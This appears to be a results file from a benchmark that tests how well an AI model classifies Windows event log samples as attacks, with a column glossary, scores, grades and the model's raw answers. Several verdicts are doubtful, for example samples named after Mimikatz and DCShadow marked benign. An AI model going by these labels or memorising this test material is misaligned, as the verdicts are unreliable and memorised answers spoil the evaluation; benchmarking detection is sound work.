@@ -1,0 +1,810 @@
+# DETECTION BENCHMARK RESULTS - column glossary
+# ----------------------------------------------------------------------
+# Model               LLM model id used to score this run
+# Filename            Source artifact analyzed (EVTX file or CSV stem)
+# Difficulty          Tag from metadata.json: easy / medium / hard
+# Test Set            A=Known Pattern, B=Obfuscated, C=Noise-heavy, D=Benign
+# Status              processed | error | context_exceeded
+# Malicious           Model verdict: YES (attack) or NO (routine/benign)
+# Confidence %        Heuristic confidence from response structure quality, not model-stated (0-100)
+# Alignment %         Share of cited evidence found verbatim in source (0-100)
+# Structure Valid     Response parsed cleanly into the required sections
+# Event IDs           Event IDs extracted from the model's EVIDENCE block
+# Processes           Process names extracted from the model's EVIDENCE block
+# Accounts            Account names extracted from the model's EVIDENCE block
+# Commands            Command lines / script blocks extracted from EVIDENCE
+# Network             IPs / hostnames / shares extracted from EVIDENCE
+# Registry            Registry keys / values extracted from EVIDENCE
+# Hallucination %     Share of cited evidence not found in source events (0-100)
+# Response Time (s)   Wall-clock seconds from prompt sent to response received
+# Extraction (6)      Did the model find the right evidence? (0-6)
+# Interpretation (6)  Did it correctly explain what the evidence implies? (0-6)
+# NoHallucination (4) 4 = no fabricated evidence, 0 = heavy fabrication
+# Reasoning (4)       Quality of the chain of reasoning in EXPLANATION (0-4)
+# Total (20)          Sum of the four criteria above (0-20)
+# Grade               Letter grade from Total: A>=17, B>=14, C>=10, D<10
+# LLM Response        Full raw text the model returned, before any parsing
+#
+# Skip these lines in pandas:  pd.read_csv(path, comment='#')
+# ----------------------------------------------------------------------
+Model,Filename,Difficulty,Test Set,Status,Malicious,Confidence %,Alignment %,Structure Valid,Event IDs,Processes,Accounts,Commands,Network,Registry,Hallucination %,Response Time (s),Extraction (6),Interpretation (6),NoHallucination (4),Reasoning (4),Total (20),Grade,LLM Response
+gpt-5.5-2026-04-23,ID4625-failed login with denied access due to account restriction.evtx,easy,A,processed,NO,100.0,100.0,YES,4625,C:\Windows\System32\winlogon.exe,FS03$,,"FS03.offsec.lan, 10.23.23.9",,0.0,12.03,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 4625
+- Processes: C:\Windows\System32\winlogon.exe
+- Accounts: FS03$
+- Commands: None
+- Network: FS03.offsec.lan, 10.23.23.9
+- Registry: None
+
+EXPLANATION:
+The events show two failed LogonType 10 attempts using winlogon.exe from 10.23.23.9, both with Event ID 4625. There is no successful logon, command execution, registry activity, or additional escalation evidence in the provided logs, so this is not enough to conclude malicious activity."
+gpt-5.5-2026-04-23,BENIGN-ID1-Admin PsExec remote diagnostic.csv,,,processed,YES,100.0,100.0,YES,"1, 4624, 5","C:\Tools\PsExec64.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\PSEXESVC.exe, C:\Windows\System32\services.exe, C:\Windows\System32\systeminfo.exe","OFFSEC\admmig, admmig, NT AUTHORITY\SYSTEM","PsExec64.exe \\SRV05 -accepteula -u OFFSEC\admmig systeminfo, powershell.exe, C:\Windows\PSEXESVC.exe, C:\Windows\system32\services.exe, systeminfo","win-jump01.offsec.lan, srv05.offsec.lan, \\SRV05, 10.23.30.10, WIN-JUMP01",,0.0,16.55,6.0,1.0,4.0,3,14.0,B,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 1, 4624, 5
+- Processes: C:\Tools\PsExec64.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\PSEXESVC.exe, C:\Windows\System32\services.exe, C:\Windows\System32\systeminfo.exe
+- Accounts: OFFSEC\admmig, admmig, NT AUTHORITY\SYSTEM
+- Commands: PsExec64.exe \\SRV05 -accepteula -u OFFSEC\admmig systeminfo, powershell.exe, C:\Windows\PSEXESVC.exe, C:\Windows\system32\services.exe, systeminfo
+- Network: win-jump01.offsec.lan, srv05.offsec.lan, \\SRV05, 10.23.30.10, WIN-JUMP01
+- Registry: None
+
+EXPLANATION:
+The events show C:\Tools\PsExec64.exe launched from powershell.exe by OFFSEC\admmig to run systeminfo on \\SRV05, followed by a Kerberos LogonType 3 from 10.23.30.10 and execution of C:\Windows\PSEXESVC.exe on srv05.offsec.lan. The sequence of remote logon, PsExec service execution, and systeminfo collection indicates remote execution and reconnaissance activity rather than an isolated routine process."
+gpt-5.5-2026-04-23,ID33205-SQL Server member added to database role.evtx,easy,A,processed,YES,100.0,93.8,YES,33205,,"OFFSEC\admmig, dbo, test-sql",ALTER ROLE [db_accessadmin] ADD MEMBER [test-sql,mssql01.offsec.lan,,0.0,14.78,5.6,1.0,4.0,2,12.6,C,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 33205
+- Processes: None
+- Accounts: OFFSEC\admmig, dbo, test-sql
+- Commands: ALTER ROLE [db_accessadmin] ADD MEMBER [test-sql]
+- Network: mssql01.offsec.lan
+- Registry: None
+
+EXPLANATION:
+The event shows OFFSEC\admmig successfully executing ALTER ROLE [db_accessadmin] ADD MEMBER [test-sql] on the database. Adding test-sql to db_accessadmin is a database role membership change that grants elevated database access administration capability."
+gpt-5.5-2026-04-23,ID33205-SQL Server user linked to a database.evtx,easy,A,processed,NO,100.0,88.9,YES,33205,,"OFFSEC\admmig, dbo, test-sql",CREATE USER [test-sql] FOR LOGIN [test-sql,mssql01.offsec.lan,,0.0,10.00,5.3,5.0,4.0,2,16.3,B,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 33205
+- Processes: None
+- Accounts: OFFSEC\admmig, dbo, test-sql
+- Commands: CREATE USER [test-sql] FOR LOGIN [test-sql]
+- Network: mssql01.offsec.lan
+- Registry: None
+
+EXPLANATION:
+The event shows OFFSEC\admmig successfully creating a database user test-sql for an existing login in RCS-TEST-db. There is no additional evidence of abuse, privilege escalation, suspicious process execution, or network activity in the provided log."
+gpt-5.5-2026-04-23,ID4723-5145-password reset with changeNTLM (Mimikatz).evtx,easy,A,processed,NO,100.0,100.0,YES,4723,,"hacker2, admmig",,rootdc1.offsec.lan,,0.0,8.14,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 4723
+- Processes: None
+- Accounts: hacker2, admmig
+- Commands: None
+- Network: rootdc1.offsec.lan
+- Registry: None
+
+EXPLANATION:
+Event ID 4723 shows an attempt to change the password for hacker2 by admmig. With only this single password-change event and no supporting process, command, network, or registry evidence, the activity cannot be determined to be malicious from the provided log alone."
+gpt-5.5-2026-04-23,ID60-High volume file downloaded with BITS.evtx,easy,A,processed,NO,100.0,83.3,YES,"3, 5, 59, 60",,OFFSEC\admmig,,"FS03.offsec.lan, releases.ubuntu.com",,0.0,11.04,5.0,5.0,4.0,2,16.0,B,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 3, 5, 59, 60
+- Processes: None
+- Accounts: OFFSEC\admmig
+- Commands: None
+- Network: FS03.offsec.lan, releases.ubuntu.com
+- Registry: None
+
+EXPLANATION:
+The events show a BITS Transfer job owned by OFFSEC\admmig downloading ubuntu-20.04.3-desktop-amd64.iso from releases.ubuntu.com. No suspicious commands, processes, registry changes, or malicious multi-event pattern are present in the provided logs."
+gpt-5.5-2026-04-23,ID4688-sqlcmd tool abuse in SQL Server.evtx,easy,A,processed,NO,100.0,100.0,YES,4688,"C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\110\Tools\Binn\SQLCMD.EXE, C:\Windows\System32\cmd.exe",admmig,"sqlcmd  -S .\RADAR,2020",mssql01.offsec.lan,,0.0,9.69,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 4688
+- Processes: C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\110\Tools\Binn\SQLCMD.EXE, C:\Windows\System32\cmd.exe
+- Accounts: admmig
+- Commands: sqlcmd  -S .\RADAR,2020
+- Network: mssql01.offsec.lan
+- Registry: None
+
+EXPLANATION:
+This event shows admmig launching SQLCMD.EXE from cmd.exe to connect to a local SQL Server instance. There is no additional event pattern, suspicious command chaining, privilege escalation, registry modification, or network indicator in the provided data to support malicious activity."
+gpt-5.5-2026-04-23,ID12-LSA Protect mode enabled RunAsPPL.evtx,easy,D,processed,NO,100.0,100.0,YES,"14, 12",,,,WIN10-client01.offsec.lan,,0.0,7.31,6.0,5.0,4.0,1,16.0,B,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 14, 12
+- Processes: None
+- Accounts: None
+- Commands: None
+- Network: WIN10-client01.offsec.lan
+- Registry: None
+
+EXPLANATION:
+The events are from Microsoft-Windows-Wininit with Event IDs 14 and 12 and contain only configuration-related fields such as Config, IsTestConfig, and Level. There are no accounts, commands, processes, registry keys, or suspicious network indicators in the event data to indicate attack behavior."
+gpt-5.5-2026-04-23,ID4664-symbolic link created.evtx,easy,A,processed,NO,100.0,100.0,YES,4664,,Admin,,WIN,,16.7,11.93,6.0,5.0,3.3,3,17.3,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 4664
+- Processes: None
+- Accounts: Admin
+- Commands: None
+- Network: WIN
+- Registry: None
+
+EXPLANATION:
+Event 4664 shows Admin created or attempted a file link involving C:\Users\Admin\Downloads\Sysmon\sysmonconf.xml and C:\Users\Admin\Downloads\sysmonconf.xml. In isolation, this does not show a malicious pattern such as privilege escalation, suspicious command execution, registry modification, or network activity."
+gpt-5.5-2026-04-23,ID4673-Privilege SeMachineAccountPrivilege called.evtx,easy,A,processed,NO,100.0,100.0,YES,4673,C:\Windows\System32\lsass.exe,hack1,,rootdc1.offsec.lan,,0.0,12.03,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 4673
+- Processes: C:\Windows\System32\lsass.exe
+- Accounts: hack1
+- Commands: None
+- Network: rootdc1.offsec.lan
+- Registry: None
+
+EXPLANATION:
+Event 4673 shows the account hack1 using SeMachineAccountPrivilege through the Security Account Manager with C:\Windows\System32\lsass.exe. This is a sensitive privilege use, but the log contains only a single event with no command line, creation event, network activity, or related sequence showing attack behavior."
+gpt-5.5-2026-04-23,ID5136-4662 sensitive GPO edited.evtx,easy,A,processed,YES,100.0,43.8,YES,"4662, 5136",,"admmig, FS02$, ROOTDC1$",,"rootdc1.offsec.lan, offsec.lan",,0.0,13.55,2.6,2.0,4.0,2,10.6,C,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4662, 5136
+- Processes: None
+- Accounts: admmig, FS02$, ROOTDC1$
+- Commands: None
+- Network: rootdc1.offsec.lan, offsec.lan
+- Registry: None
+
+EXPLANATION:
+The events show admmig accessing a directory service object and then modifying the versionNumber attribute on CN={127328D6-A8A8-49E3-BA71-410C945F42CE},CN=POLICIES,CN=SYSTEM,DC=OFFSEC,DC=LAN from 1 to 2. This pattern indicates a Group Policy container change rather than isolated routine access, which is suspicious because GPO modification can be used to push malicious configuration across systems."
+gpt-5.5-2026-04-23,ID4964-Login of a member of a special group.evtx,easy,A,processed,NO,100.0,100.0,YES,4964,,"LOCAL SERVICE, ROOTDC1$, admmig",,rootdc1.offsec.lan,,0.0,14.19,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 4964
+- Processes: None
+- Accounts: LOCAL SERVICE, ROOTDC1$, admmig
+- Commands: None
+- Network: rootdc1.offsec.lan
+- Registry: None
+
+EXPLANATION:
+The events show repeated 4964 entries where special groups were assigned to new logons for the account admmig on rootdc1.offsec.lan. This indicates privileged logon activity, but the logs contain no commands, processes, registry changes, or network source details showing attack behavior."
+gpt-5.5-2026-04-23,ID5124-OCSP security settings changed.evtx,easy,A,processed,NO,100.0,100.0,YES,"5121, 5120, 5123, 5124",,"admmig, BUILTIN\Administrators, IIS APPPOOL\OCSPISAPIAppPool",,pki01.offsec.lan,,0.0,12.84,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 5121, 5120, 5123, 5124
+- Processes: None
+- Accounts: admmig, BUILTIN\Administrators, IIS APPPOOL\OCSPISAPIAppPool
+- Commands: None
+- Network: pki01.offsec.lan
+- Registry: None
+
+EXPLANATION:
+The events show OCSP/PKI-related configuration and security setting changes performed by admmig on pki01.offsec.lan. No processes, commands, registry changes, or network indicators are present, and the logged changes alone do not demonstrate attack behavior."
+gpt-5.5-2026-04-23,ID1-SYSMON driver unload (FilterManager).evtx,easy,A,processed,NO,100.0,100.0,YES,1,,,,,,0.0,4.00,6.0,4.0,4.0,1,15.0,B,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: None
+- Accounts: None
+- Commands: None
+- Network: None
+- Registry: None
+
+EXPLANATION:
+This event shows Microsoft-Windows-FilterManager reporting DeviceName SysmonDrv with FinalStatus 0x0. There are no commands, accounts, network indicators, registry keys, or process executions in the log to indicate attack behavior."
+gpt-5.5-2026-04-23,ID13-Defender service configuration disabled.evtx,easy,A,processed,NO,100.0,83.3,YES,13,C:\Windows\system32\services.exe,,,win10-02.offsec.lan,HKLM\System\CurrentControlSet\Services\WdNisDrv\Start,0.0,8.13,5.0,5.0,4.0,3,17.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 13
+- Processes: C:\Windows\system32\services.exe
+- Accounts: None
+- Commands: None
+- Network: win10-02.offsec.lan
+- Registry: HKLM\System\CurrentControlSet\Services\WdNisDrv\Start
+
+EXPLANATION:
+The events show services.exe setting the same registry value for HKLM\System\CurrentControlSet\Services\WdNisDrv\Start to DWORD (0x00000003). There are no commands, accounts, or additional indicators showing attacker activity or an escalating sequence, so this appears to be routine service configuration activity."
+gpt-5.5-2026-04-23,ID8-Module Virtualization disabled (Credential Guard).evtx,easy,A,processed,NO,100.0,100.0,YES,"8, 10, 7, 9",,,,"N900B7FFD.kapsch.co.at, N900B7FFD.kbceu.kbcnet.tech",,0.0,15.26,6.0,5.0,4.0,1,16.0,B,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 8, 10, 7, 9
+- Processes: None
+- Accounts: None
+- Commands: None
+- Network: N900B7FFD.kapsch.co.at, N900B7FFD.kbceu.kbcnet.tech
+- Registry: None
+
+EXPLANATION:
+The events show Microsoft-Windows-Servicing state changes for Windows-Defender-Default-Definitions and Windows optional components such as Microsoft-Windows-Subsystem-Linux, VirtualMachinePlatform, MSRDC-Infrastructure, and HypervisorPlatform. The paired state-change events include successful ErrorCode 0x0 entries and do not include commands, accounts, processes, or registry modifications indicating attack behavior."
+gpt-5.5-2026-04-23,ID4739-Domain policy changed by non system account.evtx,easy,A,processed,NO,100.0,100.0,YES,4739,,admmig,,rootdc1.offsec.lan,,0.0,5.47,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 4739
+- Processes: None
+- Accounts: admmig
+- Commands: None
+- Network: rootdc1.offsec.lan
+- Registry: None
+
+EXPLANATION:
+Event ID 4739 indicates a domain policy change by admmig, but the logged policy fields contain no specific changed values. With only this single event and no associated commands, processes, registry activity, or network indicators beyond the host, there is insufficient evidence of attack behavior."
+gpt-5.5-2026-04-23,ID4908-Special group table changed.evtx,easy,A,processed,NO,100.0,100.0,YES,4908,,,,rootdc1.offsec.lan,,0.0,14.46,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 4908
+- Processes: None
+- Accounts: None
+- Commands: None
+- Network: rootdc1.offsec.lan
+- Registry: None
+
+EXPLANATION:
+The events only show Microsoft-Windows-Security-Auditing Event ID 4908 entries on rootdc1.offsec.lan with SidList values changing from ""-"" to lists of SIDs. There are no usernames, processes, commands, registry keys, or external network indicators showing attack behavior in the provided data."
+gpt-5.5-2026-04-23,ID4688-Linux Subsystem installation (WSL).evtx,easy,A,processed,NO,100.0,100.0,YES,4688,"C:\Windows\System32\Dism.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Users\admmig\AppData\Local\Temp\EF2EDF0A-3F72-4E1D-A537-087B0AA53178\DismHost.exe, C:\Windows\servicing\TrustedInstaller.exe, C:\Windows\System32\services.exe, C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.19041.740_none_e752aa59261f271f\TiWorker.exe, C:\Windows\System32\svchost.exe, C:\Windows\System32\taskhostw.exe, C:\Users\admmig\AppData\Local\Temp\2FAAA3DB-0463-415C-A03A-35CDC98DA25F\DismHost.exe, C:\Windows\System32\wsl.exe, C:\Windows\System32\dllhost.exe","admmig, WIN10-CLIENT01$","""C:\WINDOWS\system32\Dism.exe"" /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart, C:\Users\admmig\AppData\Local\Temp\EF2EDF0A-3F72-4E1D-A537-087B0AA53178\dismhost.exe {F4C84A6D-0631-443F-B849-03CA53B4AE35}, C:\WINDOWS\servicing\TrustedInstaller.exe, C:\WINDOWS\winsxs\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.19041.740_none_e752aa59261f271f\TiWorker.exe -Embedding, taskhostw.exe, ""C:\WINDOWS\system32\Dism.exe"" /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart, C:\Users\admmig\AppData\Local\Temp\2FAAA3DB-0463-415C-A03A-35CDC98DA25F\dismhost.exe {2FF3BABF-D4B4-410C-B05A-9786E419DF67}, ""C:\WINDOWS\system32\wsl.exe"" --set-default-version 2, C:\WINDOWS\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}",,,0.0,14.11,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 4688
+- Processes: C:\Windows\System32\Dism.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Users\admmig\AppData\Local\Temp\EF2EDF0A-3F72-4E1D-A537-087B0AA53178\DismHost.exe, C:\Windows\servicing\TrustedInstaller.exe, C:\Windows\System32\services.exe, C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.19041.740_none_e752aa59261f271f\TiWorker.exe, C:\Windows\System32\svchost.exe, C:\Windows\System32\taskhostw.exe, C:\Users\admmig\AppData\Local\Temp\2FAAA3DB-0463-415C-A03A-35CDC98DA25F\DismHost.exe, C:\Windows\System32\wsl.exe, C:\Windows\System32\dllhost.exe
+- Accounts: admmig, WIN10-CLIENT01$
+- Commands: ""C:\WINDOWS\system32\Dism.exe"" /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart, C:\Users\admmig\AppData\Local\Temp\EF2EDF0A-3F72-4E1D-A537-087B0AA53178\dismhost.exe {F4C84A6D-0631-443F-B849-03CA53B4AE35}, C:\WINDOWS\servicing\TrustedInstaller.exe, C:\WINDOWS\winsxs\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.19041.740_none_e752aa59261f271f\TiWorker.exe -Embedding, taskhostw.exe, ""C:\WINDOWS\system32\Dism.exe"" /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart, C:\Users\admmig\AppData\Local\Temp\2FAAA3DB-0463-415C-A03A-35CDC98DA25F\dismhost.exe {2FF3BABF-D4B4-410C-B05A-9786E419DF67}, ""C:\WINDOWS\system32\wsl.exe"" --set-default-version 2, C:\WINDOWS\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The events show admmig running Dism.exe from PowerShell to enable Microsoft-Windows-Subsystem-Linux and VirtualMachinePlatform, followed by wsl.exe setting the default version to 2. The related DismHost.exe, TrustedInstaller.exe, TiWorker.exe, taskhostw.exe, and DllHost.exe activity aligns with Windows feature servicing behavior, and there are no network or registry indicators in the provided logs."
+gpt-5.5-2026-04-23,ID4661-Suspicious SAM access to password attributes by LSASS (Dcshadow).evtx,easy,A,processed,NO,100.0,75.0,YES,4661,C:\Windows\System32\lsass.exe,ROOTDC1$,,rootdc1.offsec.lan,,0.0,14.48,4.5,5.0,4.0,2,15.5,B,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 4661
+- Processes: C:\Windows\System32\lsass.exe
+- Accounts: ROOTDC1$
+- Commands: None
+- Network: rootdc1.offsec.lan
+- Registry: None
+
+EXPLANATION:
+The events show repeated Security Account Manager handle requests performed by C:\Windows\System32\lsass.exe under ROOTDC1$ on rootdc1.offsec.lan. No commands, registry changes, external accounts, or network indicators beyond the logged computer hostname are present, so the evidence does not show attack behavior."
+gpt-5.5-2026-04-23,ID800-4103-4104-Domain group discovery via PowerShell.evtx,easy,A,processed,YES,100.0,100.0,YES,"800, 4103, 4104",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,OFFSEC\admmig,"Get-ADGroupMember -Identity 'Administrators', PSConsoleHostReadline, Out-Default, prompt, Microsoft.PowerShell.Core\Set-StrictMode -Off",jump01.offsec.lan,,0.0,22.29,6.0,1.0,4.0,3,14.0,B,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 800, 4103, 4104
+- Processes: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+- Accounts: OFFSEC\admmig
+- Commands: Get-ADGroupMember -Identity 'Administrators', PSConsoleHostReadline, Out-Default, prompt, Microsoft.PowerShell.Core\Set-StrictMode -Off
+- Network: jump01.offsec.lan
+- Registry: None
+
+EXPLANATION:
+PowerShell was used by OFFSEC\admmig to run Get-ADGroupMember -Identity 'Administrators', which enumerated privileged group membership including Domain Admins, Enterprise Admins, and Administrator. This pattern is consistent with Active Directory privilege discovery rather than routine shell activity."
+gpt-5.5-2026-04-23,ID800-4103-4104-Local group discovery via PowerShell.evtx.evtx,easy,A,processed,NO,100.0,100.0,YES,"800, 4103, 4104",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"OFFSEC\admmig, JUMP01\Administrator, OFFSEC\Domain Admins, OFFSEC\Nessus Local Access, OFFSEC\SG_LocalAdmin_Lab","PSConsoleHostReadline, Get-LocalGroupMember -Name Administrators, Out-Default, prompt, Microsoft.PowerShell.Core\Set-StrictMode -Off",jump01.offsec.lan,,0.0,14.53,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 800, 4103, 4104
+- Processes: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+- Accounts: OFFSEC\admmig, JUMP01\Administrator, OFFSEC\Domain Admins, OFFSEC\Nessus Local Access, OFFSEC\SG_LocalAdmin_Lab
+- Commands: PSConsoleHostReadline, Get-LocalGroupMember -Name Administrators, Out-Default, prompt, Microsoft.PowerShell.Core\Set-StrictMode -Off
+- Network: jump01.offsec.lan
+- Registry: None
+
+EXPLANATION:
+The activity shows OFFSEC\admmig using PowerShell to run Get-LocalGroupMember -Name Administrators and display the local Administrators group membership. This is administrative enumeration and there is no evidence in the provided events of privilege changes, persistence, execution of payloads, or network activity beyond the logged computer name."
+gpt-5.5-2026-04-23,ID600-Active Directory module called by PowerShell.evtx,easy,A,processed,NO,100.0,100.0,YES,600,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,jump01.offsec.lan,,0.0,8.59,6.0,5.0,4.0,1,16.0,B,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 600
+- Processes: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+- Accounts: None
+- Commands: None
+- Network: jump01.offsec.lan
+- Registry: None
+
+EXPLANATION:
+This event shows the PowerShell ActiveDirectory provider starting in ConsoleHost with powershell.exe. No command line content, account activity, registry modification, or suspicious sequence is present in the provided data, so this appears routine in isolation."
+gpt-5.5-2026-04-23,ID4825-Denied RDP connection with valid credentials.evtx,easy,A,processed,NO,100.0,100.0,YES,4825,,svc6test1,,"fs02.offsec.lan, 10.23.23.9",,0.0,11.66,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 4825
+- Processes: None
+- Accounts: svc6test1
+- Commands: None
+- Network: fs02.offsec.lan, 10.23.23.9
+- Registry: None
+
+EXPLANATION:
+The logs show two EventID 4825 entries for svc6test1 from 10.23.23.9 on fs02.offsec.lan within a short period. There are no process, command, registry, success, or privilege-change events in the provided data to establish an attack pattern."
+gpt-5.5-2026-04-23,ID5142-5143-Mimispool print share created and modified.evtx,easy,A,processed,NO,100.0,66.7,YES,"5142, 5143",,FS03$,,FS03.offsec.lan,,0.0,8.30,4.0,6.0,4.0,3,17.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 5142, 5143
+- Processes: None
+- Accounts: FS03$
+- Commands: None
+- Network: FS03.offsec.lan
+- Registry: None
+
+EXPLANATION:
+The events show the built-in print$ share being created and modified on FS03.offsec.lan by FS03$, with the share path set to C:\Windows\system32\spool\drivers. The changes shown are consistent with routine printer driver share configuration and do not include suspicious commands, processes, registry keys, or external network indicators."
+gpt-5.5-2026-04-23,ID4-OpenSSH server listening.evtx,easy,A,processed,NO,100.0,100.0,YES,4,sshd,,,"win10-02.offsec.lan, ::, 0.0.0.0",,16.7,7.89,6.0,5.0,3.3,2,16.3,B,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 4
+- Processes: sshd
+- Accounts: None
+- Commands: None
+- Network: win10-02.offsec.lan, ::, 0.0.0.0
+- Registry: None
+
+EXPLANATION:
+The events show OpenSSH sshd starting and listening on port 22 on win10-02.offsec.lan. There are no accounts, commands, registry changes, authentication activity, or other indicators in the provided data showing attack behavior."
+gpt-5.5-2026-04-23,BENIGN-ID5145-Veeam backup reads files over backup share.csv,,,processed,NO,100.0,91.7,YES,"4624, 4672, 5140, 5145, 4673",C:\Windows\System32\svchost.exe,svc_veeam,,"fileserver01.offsec.lan, 10.23.50.20, BKP01",,0.0,12.62,5.5,6.0,4.0,4,19.5,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 4624, 4672, 5140, 5145, 4673
+- Processes: C:\Windows\System32\svchost.exe
+- Accounts: svc_veeam
+- Commands: None
+- Network: fileserver01.offsec.lan, 10.23.50.20, BKP01
+- Registry: None
+
+EXPLANATION:
+The events show svc_veeam performing a Kerberos network logon from BKP01 at 10.23.50.20, receiving backup-related privileges, and accessing \\*\Backups$ backup files. This pattern is consistent with routine backup service account activity rather than attack behavior based on the provided logs."
+gpt-5.5-2026-04-23,"ID 768,775,793,796,817,840-BitLocker encryption activated.evtx",easy,D,processed,NO,100.0,100.0,YES,"4122, 796, 817, 840, 775, 780, 768, 793",,,,"WIN-47PN2IE7CTG, DESKTOP-7GBMVRG, GUAPOS-PC",,0.0,16.72,6.0,5.0,4.0,1,16.0,B,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 4122, 796, 817, 840, 775, 780, 768, 793
+- Processes: None
+- Accounts: None
+- Commands: None
+- Network: WIN-47PN2IE7CTG, DESKTOP-7GBMVRG, GUAPOS-PC
+- Registry: None
+
+EXPLANATION:
+The events are from Microsoft-Windows-BitLocker-API and show BitLocker-related activity on C: with volume and protector identifiers, but there are no accounts, processes, commands, or registry changes indicating attacker execution. The repeated 4122 events and BitLocker management events appear consistent with BitLocker hardware/PCR and volume management activity rather than clear malicious behavior based only on the provided logs."
+gpt-5.5-2026-04-23,ID11-DNS hosts files modified.evtx,easy,A,processed,NO,100.0,100.0,YES,11,C:\Program Files\Notepad++\notepad++.exe,,,fs03vuln.offsec.lan,,0.0,14.73,6.0,5.0,4.0,1,16.0,B,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 11
+- Processes: C:\Program Files (x86)\Notepad++\notepad++.exe
+- Accounts: None
+- Commands: None
+- Network: fs03vuln.offsec.lan
+- Registry: None
+
+EXPLANATION:
+The log shows C:\Program Files (x86)\Notepad++\notepad++.exe associated with Event ID 11 targeting C:\Windows\System32\drivers\etc\hosts. There are no commands, accounts, registry changes, or additional related events showing an attack pattern, so this is not sufficient to identify malicious behavior."
+gpt-5.5-2026-04-23,BENIGN-ID33205-SQL Server successful admin login.csv,,,processed,NO,100.0,75.0,YES,33205,,"OFFSEC\svc-sqlreport, dbo",,"10.23.23.41, mssql01.offsec.lan",,0.0,7.98,4.5,6.0,4.0,4,18.5,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 33205
+- Processes: None
+- Accounts: OFFSEC\svc-sqlreport, dbo
+- Commands: None
+- Network: 10.23.23.41, mssql01.offsec.lan
+- Registry: None
+
+EXPLANATION:
+The events show repeated successful SQL Server logins for OFFSEC\svc-sqlreport using Windows authentication from 10.23.23.41. No commands, process execution, registry changes, privilege changes, or failed login pattern are present in the provided data, so this appears routine based on the evidence."
+gpt-5.5-2026-04-23,ID33205-SQL Server failed login with disabled SA account.evtx,easy,A,processed,YES,100.0,75.0,YES,33205,,sa,,"mssql01.offsec.lan, 10.23.23.9",,0.0,12.90,4.5,6.0,4.0,2,16.5,B,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 33205
+- Processes: None
+- Accounts: sa
+- Commands: None
+- Network: mssql01.offsec.lan, 10.23.23.9
+- Registry: None
+
+EXPLANATION:
+Two MSSQL audit events show failed login attempts for server_principal_name:sa from 10.23.23.9 on mssql01.offsec.lan. The repeated failed attempts against the sa account indicate attempted unauthorized access rather than routine activity."
